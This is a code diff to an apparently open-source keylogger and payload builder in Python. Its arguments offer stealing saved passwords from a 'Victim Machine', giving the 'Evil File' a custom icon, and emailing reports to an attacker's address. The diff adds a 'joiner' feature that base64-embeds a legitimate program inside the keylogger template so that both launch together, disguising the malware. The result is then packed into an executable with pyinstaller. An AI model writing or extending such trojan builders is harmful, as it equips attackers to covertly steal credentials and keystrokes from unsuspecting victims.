@@ -33,12 +33,12 @@ def get_arguments():
     parser.add_argument("-w", "--windows", dest="windows", help="Generate a Windows executable.", action='store_true')
     parser.add_argument("-l", "--linux", dest="linux", help="Generate a Linux executable.", action='store_true')
     parser.add_argument("-s", "--steal-password", dest="stealer", help=f"Steal Saved Password from Victim Machine [{Fore.RED}Supported OS : Windows{Fore.YELLOW}]", action='store_true')
-
     parser.add_argument("-d", "--debug", dest="debug", help="Payload Will Run In Foreground with CMD Window, To get Appropriate Execution Error", action='store_true')
     
     
     required_arguments = parser.add_argument_group(f'{Fore.RED}Required Arguments{Fore.GREEN}')
     parser.add_argument("-b", "--bind", dest="bind", help="AutoBinder : Specify Path of Legitimate file.")
+    parser.add_argument("-j", "--joiner", dest="joiner", help=f"Launches a legitimate file together with the keylogger (Must be True or False) [{Fore.RED}Supported OS : Windows{Fore.YELLOW}]")
     required_arguments.add_argument("--icon", dest="icon", help="Specify Icon Path, Icon of Evil File [Note : Must Be .ico].")
     required_arguments.add_argument("-e", "--email", dest="email", help="Email address to send reports to.")
     required_arguments.add_argument("-p", "--password", dest="password", help="Password for the email address given in the -e argument.")
@@ -382,12 +382,25 @@ if __name__ == '__main__':
                     with open(filename,"rb") as f:
                         bdata = b64e(f.read()).decode()
                     sing_file = arguments.bind
+                    norm = arguments.bind.replace('/', '\\')
+                    legit_file = f'{mainfold}\\{norm}'
+                    with open(legit_file,"rb") as j:
+                        legitsoft = b64e(j.read()).decode()
                     iname = f'{mainfold}\{arguments.icon}'
                     fname = f"{arguments.out}.py"
-                    with open(f"{mainfold}\loader_mask.py","r") as f:
-                        mask = f.read()
-                    with open(fname,"w") as f:
-                        f.write(mask.replace("WDVPIVAlQEFQWzRcUFpYNTQoUF4pN0NDKTd9JEVJQ0FSLVNUQU5EQVJELUFOVElWSVJVUy1URVNULUZJTEUhJEgrSCo=",bdata))
+                    if f'{arguments.joiner}' == 'True':
+                        print(f'{Fore.YELLOW}\n[*] Entering the launch of a legitimate program')
+                        with open(f"{mainfold}\joiner_mask.py","r") as f:
+                            mask = f.read()
+                            with open(fname,"w") as f:
+                                legit = mask.replace("WDVPIVAlQEFQWzRcUFpYNTQoUF4pN0NDKTd9JEVJQ0FSLVNUQU5EQVJELUFOVElWSVJVUy1URVNULUZJTEUhJEgrSCo=",bdata)
+                                f.write(legit.replace("BSVPIVAlQEFQWzRcUFpYNTQoUF4pN0NDKTd9JEVJQ0FSLVNUQU5EQVJELUFOVElWSVJVUy1URVNULUZJTEUhJEgrSCo=",legitsoft))
+                        print(f"\n{Fore.GREEN}[+] Successfully!\n")
+                    else:
+                        with open(f"{mainfold}\loader_mask.py","r") as f:
+                            mask = f.read()
+                        with open(fname,"w") as f:
+                            f.write(mask.replace("WDVPIVAlQEFQWzRcUFpYNTQoUF4pN0NDKTd9JEVJQ0FSLVNUQU5EQVJELUFOVElWSVJVUy1URVNULUZJTEUhJEgrSCo=",bdata))
                     print(f"{Fore.MAGENTA}")
                     os.system(f"pyinstaller --onefile --clean {fname} {f'-i {iname}' if iname != '' else ''} > nul")
                     finname = f"{arguments.out}.exe"
